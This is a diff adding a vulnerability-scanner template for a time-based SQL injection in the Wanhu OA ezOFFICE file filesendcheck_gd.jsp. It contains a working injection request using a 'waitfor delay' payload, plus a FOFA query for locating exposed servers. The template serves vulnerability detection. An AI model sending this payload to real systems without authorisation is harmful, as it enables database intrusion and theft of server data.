@@ -1,0 +1,30 @@
+id: wanhu-filesendcheck-gd-sqli
+
+info:
+  name: WanhuOA filesendcheck_gd.jsp - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    The Wanhu OA filesendcheck_gd.jsp file has a SQL injection vulnerability. An attacker can perform SQL injection into the database by sending a special request package and obtain sensitive information on the server.
+  reference:
+    - https://mp.weixin.qq.com/s/uImiGEs7hkT6ocHGSwaTwA
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="万户网络-ezOFFICE"
+  tags: 万户网络-ezOFFICE
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 200'
+          - 'contains(body, "正在归档中,请稍后")'
+        condition: and
